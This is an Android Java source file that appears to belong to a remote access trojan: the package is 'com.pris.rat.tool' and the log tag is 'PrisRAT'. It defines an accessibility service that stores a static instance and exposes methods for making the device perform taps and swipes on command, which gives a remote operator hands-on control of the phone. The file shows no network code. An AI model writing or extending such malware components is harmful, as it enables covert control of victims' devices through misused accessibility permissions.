package com.pris.rat.tool;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONObject;

public class PrisAccessibility extends AccessibilityService {
    private static final String TAG = "PrisRAT";
    public static PrisAccessibility instance = null;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.d(TAG, "Accessibility connected");
    }

    public static void performTap(float x, float y) {
        if (instance == null) {
            Log.e(TAG, "Accessibility not ready");
            return;
        }
        try {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
            instance.dispatchGesture(builder.build(), null, null);
            Log.d(TAG, "Tap at " + x + "," + y);
        } catch (Exception e) {
            Log.e(TAG, "Tap error", e);
        }
    }

    public static void performSwipe(float x1, float y1, float x2, float y2) {
        if (instance == null) return;
        try {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
            instance.dispatchGesture(builder.build(), null, null);
        } catch (Exception ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}

    @Override
    public void onInterrupt() {}
}